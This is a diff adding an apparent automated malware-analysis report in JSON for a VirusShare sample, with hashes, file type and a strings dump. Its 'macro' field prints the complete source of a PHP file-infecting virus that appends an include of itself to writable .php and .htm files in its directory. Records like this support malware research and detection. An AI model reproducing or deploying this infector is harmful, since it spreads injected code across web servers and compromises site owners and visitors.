@@ -1,0 +1,53 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {},
+        "macro": "<?php\n$handle=opendir('.');\nwhile ($file = readdir($handle))\n{ $infected=true;\n  $executable=false;\n\n if ( ($executable = strstr ($file, '.php')) || ($executable = strstr ($file, '.htm')) || ($executable = strstr ($file, '.php')) )\n if ( is_file($file) && is_writeable($file) )\n {\n   $host = fopen($file, \"r\");\n   $contents = fread ($host, filesize ($file));\n   $sig = strstr ($contents, 'pirus.php');\n   if(!$sig) $infected=false;\n }\n //infect\n if (($infected==false))\n  {\n   $host = fopen($file, \"a\");\n   fputs($host,\"<?php \");\n   fputs($host,\"include(\\\"\");\n   fputs($host,__FILE__);\n   fputs($host,\"\\\"); \");\n   fputs($host,\"?>\");\n   fclose($host);\n   return;\n }\n}\nclosedir($handle);\n?>"
+    },
+    "filename": "VirusShare_379bd651d0599dfd5b2c48ccf100d930",
+    "filesize": 718,
+    "filetype": "PHP script, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "379bd651d0599dfd5b2c48ccf100d930",
+        "sha1": "2d638bda17eff5a7fa72cd6ed95bd7dda33f7f88",
+        "sha256": "f9b4f30de4972ea1f99c9764aa861712a5d1a8c1a2d6deb542d21d0ec0f1ec5f"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<?php",
+            "$handle=opendir('.');",
+            "while ($file = readdir($handle))",
+            "{ $infected=true;",
+            "  $executable=false;",
+            " if ( ($executable = strstr ($file, '.php')) || ($executable = strstr ($file, '.htm')) || ($executable = strstr ($file, '.php')) )",
+            " if ( is_file($file) && is_writeable($file) )",
+            "   $host = fopen($file, \"r\");",
+            "   $contents = fread ($host, filesize ($file));",
+            "   $sig = strstr ($contents, 'pirus.php');",
+            "   if(!$sig) $infected=false;",
+            " //infect",
+            " if (($infected==false))",
+            "   $host = fopen($file, \"a\");",
+            "   fputs($host,\"<?php \");",
+            "   fputs($host,\"include(\\\"\");",
+            "   fputs($host,__FILE__);",
+            "   fputs($host,\"\\\"); \");",
+            "   fputs($host,\"?>\");",
+            "   fclose($host);",
+            "   return;",
+            "closedir($handle);"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.265114",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
